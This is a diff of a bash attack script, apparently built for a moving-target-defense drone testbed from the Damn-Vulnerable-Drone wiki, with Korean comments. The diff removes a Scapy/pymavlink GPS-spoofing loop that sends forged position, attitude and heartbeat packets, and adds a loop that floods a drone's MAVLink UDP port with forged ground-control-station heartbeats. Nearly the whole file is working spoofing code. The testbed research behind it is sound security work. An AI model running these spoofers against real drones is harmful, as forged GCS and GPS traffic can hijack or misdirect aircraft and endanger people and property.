@@ -1,144 +1,87 @@
 #!/usr/bin/env bash
-
-# --- Process Command Line Arguments ---
-# Example: Assign first arg to INTENSITY, default 'medium'
-# INTENSITY="${1:-medium}"
-# Example: Assign second arg to DURATION_SECONDS, default '30'
-# DURATION_SECONDS="${2:-30}"
-# echo "Parameters: Intensity=$INTENSITY, Duration=$DURATION_SECONDS"
-# Add more parameter processing as needed for the specific script
-# ------------------------------------
-
-# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/GPS-Spoofing.md
-# Created: 2025-09-14 13:46:03
-# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
+# Auto-generated from: Ground-Control-Station-Spoofing.md
+set -euo pipefail
 
 # MTD_INTERFACE_START
 # =======================================================================
-# MTD-aware Target Acquisition (from Orchestrator Environment)
-# =======================================================================
-# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
-# 설정될 것을 기대하고 실행됩니다.
-
+# MTD 환경 변수를 통한 동적 타겟 획득
 if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
     echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
-    echo "This script must be run via the attack_orchestrator.py" >&2
+    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
     exit 1
 fi
 
-echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
+# 서비스 타입에 따라 TARGET_PORT 기본값 설정
+# GCS Spoofing은 드론(DRONE_MAVLINK)을 향해 Heartbeat를 전송하므로 UDP 14550을 가정합니다.
+case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
+  DRONE_MAVLINK)
+    TARGET_PORT="${TARGET_PORT:-14550}" # 기본 MAVLink UDP 포트
+    ;;
+  *)
+    :
+    ;;
+esac
+
+echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
 # MTD_INTERFACE_END
 
-set -euo pipefail
-
-# 기준 경로 (요구사항)
+# 기준 경로 및 로깅 설정
 export BASE="${BASE:-$PWD}"
-
-# 공통 로그 연결(선택사항) - 존재 시 로드
 if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
-  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
-  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
+    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
+    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
 fi
 
-log "[ATTACK] id=gps-spoofing src=GPS-Spoofing.md"
-log "[BLOCK 1] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-# --- argv glue for converter ---
-import os, sys, re
-if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
-    if ep.startswith('udp:'):
-        try:
-            _, rest = ep.split(':', 1)
-            ep = rest
-        except ValueError:
-            pass
-    # expect ip:port
-    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
-        sys.argv = [sys.argv[0], ep]
+log "[ATTACK] id=ground-control-station-spoofing src=Ground-Control-Station-Spoofing.md"
+log "[BLOCK 1] type=python (Inline GCS Heartbeat Spoofing Script)"
+
+# MAVLink Heartbeat Spoofing을 통해 드론에게 자신이 GCS임을 알리는 Python 인라인 스크립트 실행
+python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
+import os, sys
+import time
 from pymavlink import mavutil
 from scapy.all import *
-import time
-import sys
 
-def create_heartbeat():
+# --- Argument Parsing from Shell ---
+if len(sys.argv) <= 1:
+    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
+    target_port = os.environ.get('TARGET_PORT', '14550')
+    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]
+
+try:
+    target_ip, target_port_str = sys.argv[1].split(':', 1)
+    target_port = int(target_port_str)
+except Exception as e:
+    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
+    sys.exit(1)
+# -----------------------------------
+
+def create_gcs_heartbeat():
+    """GCS(Ground Control Station) 역할을 하는 Heartbeat 메시지를 생성합니다."""
     mav = mavutil.mavlink.MAVLink(None)
-    mav.srcSystem = 1
-    mav.srcComponent = 1
+    # Source System/Component ID를 GCS 값으로 설정하여 스푸핑
+    mav.srcSystem = 255 
+    mav.srcComponent = 190 
     return mav.heartbeat_encode(
-        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
-        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
-        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
-        custom_mode=3,
+        type=mavutil.mavlink.MAV_TYPE_GCS, # GCS 타입
+        autopilot=mavutil.mavlink.MAV_AUTOPILOT_GENERIC,
+        base_mode=0,
+        custom_mode=0,
         system_status=mavutil.mavlink.MAV_STATE_ACTIVE
     ).pack(mav)
 
-def create_gps_raw_int():
-    mav = mavutil.mavlink.MAVLink(None)
-    mav.srcSystem = 1
-    mav.srcComponent = 1
-    return mav.gps_raw_int_encode(
-        time_usec=int(time.time() * 1e6),
-        fix_type=3,
-        lat=473566100,
-        lon=854619300,
-        alt=1500,
-        eph=100,
-        epv=100,
-        vel=500,
-        cog=0,
-        satellites_visible=10
-    ).pack(mav)
-
-def create_global_position_int():
-    mav = mavutil.mavlink.MAVLink(None)
-    mav.srcSystem = 1
-    mav.srcComponent = 1
-    return mav.global_position_int_encode(
-        time_boot_ms=int(time.time() * 1e3) % 4294967295,
-        lat=473566100,
-        lon=854619300,
-        alt=1500000,
-        relative_alt=1500000,
-        vx=0,
-        vy=0,
-        vz=0,
-        hdg=0
-    ).pack(mav)
-
-def create_attitude():
-    mav = mavutil.mavlink.MAVLink(None)
-    mav.srcSystem = 1
-    mav.srcComponent = 1
-    return mav.attitude_encode(
-        time_boot_ms=int(time.time() * 1e3) % 4294967295,
-        roll=0.1,
-        pitch=0.1,
-        yaw=1.0,
-        rollspeed=0.01,
-        pitchspeed=0.01,
-        yawspeed=0.1
-    ).pack(mav)
-
 def send_mavlink_packet(packet_data, target_ip, target_port):
+    """Scapy를 사용하여 UDP 기반 MAVLink 패킷을 전송합니다."""
     packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
-    send(packet)
+    send(packet, verbose=False)
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python gps-spoofing.py <ip:port>")
-        sys.exit(1)
-
-    target_ip, target_port = sys.argv[1].split(':')
-    target_port = int(target_port)
+    print(f"[INFO] Starting GCS Heartbeat Spoofing to UDP {target_ip}:{target_port}")
 
     while True:
-        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
-        send_mavlink_packet(create_gps_raw_int(), target_ip, target_port)
-        send_mavlink_packet(create_global_position_int(), target_ip, target_port)
-        send_mavlink_packet(create_attitude(), target_ip, target_port)
-        print(f"Sent spoofed MAVLink data to {target_ip}:{target_port}")
+        send_mavlink_packet(create_gcs_heartbeat(), target_ip, target_port)
+        time.sleep(0.1) # 공격 속도 조절
 PY
 
-log "[BLOCK 2] type=shell"
-sudo python3 gps-spoofing.py ${TARGET_IP}:14550
+log "[BLOCK 2] type=control (Foreground Execution)"
+log "Attack running in foreground Python loop; orchestrator is responsible for lifecycle (SIGTERM/timeout)."
